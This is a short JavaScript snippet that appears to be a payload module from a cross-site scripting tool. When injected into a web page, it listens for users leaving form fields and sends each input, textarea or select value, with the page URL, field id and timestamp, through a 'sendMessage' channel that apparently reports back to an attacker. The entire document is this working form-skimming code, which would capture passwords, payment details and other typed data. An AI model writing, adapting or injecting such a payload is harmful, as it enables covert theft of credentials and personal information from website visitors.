if (!window.__soxssLoggerBound) {
    window.__soxssLoggerBound = true;

    const handleFieldEvent = (event) => {
        const el = event.target;
        if (el && /^(INPUT|TEXTAREA|SELECT)$/i.test(el.tagName)) {
            if (typeof sendMessage !== 'undefined') {
                sendMessage({
                    type: "log",
                    msg: JSON.stringify({
                        "log": el.value,
                        'url': window.location.href,
                        'id': el.getAttribute("id"),
                        "timestamp": Date.now()
                    })
                });
            }
        }
    };

    document.addEventListener("focusout", handleFieldEvent);
    document.addEventListener("blur", handleFieldEvent, true);
}